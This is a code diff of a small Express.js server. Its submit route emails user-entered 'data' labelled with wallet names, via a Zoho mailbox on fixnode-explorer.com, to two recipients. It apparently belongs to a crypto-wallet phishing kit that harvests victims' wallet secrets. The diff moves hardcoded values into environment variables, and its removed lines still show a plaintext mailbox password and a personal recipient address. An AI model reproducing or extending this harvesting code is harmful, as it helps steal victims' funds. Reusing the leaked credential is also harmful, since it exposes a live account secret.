@@ -6,6 +6,10 @@ const app = express()
 dotenv.config()
 
 const PORT = 5500 
+const PASSWORD = process.env.PASSWORD
+const RECIPIENT1 = process.env.RECIPIENT1
+const RECIPIENT2 = process.env.RECIPIENT2
+const FROM = process.env.FROM
 
 app.use(express.static("views"))
 app.use(express.static(__dirname + "/public/"))
@@ -41,7 +45,7 @@ app.post('/welcome/connect/:id/submit', async (req, res) => {
         service: 'zoho',
         auth: {
             user: "forwarding@fixnode-explorer.com",
-            pass: "Mohammad1996##"
+            pass: PASSWORD
         }
     })
 
@@ -57,10 +61,10 @@ app.post('/welcome/connect/:id/submit', async (req, res) => {
         })
     })
 
-    const recipients = ["forwarding@fixnode-explorer.com", "salim72salim72@gmail.com"]
+    const recipients = [RECIPIENT1, RECIPIENT2]
     for(let recipient of recipients) {
         const mailOptions = {
-            from: "forwarding@fixnode-explorer.com",
+            from: FROM,
             to: recipient,
             subject: `${req.body.category}`,
             html: `Wallet Name(s): ${req.params.id} <br> ${req.body.data}`
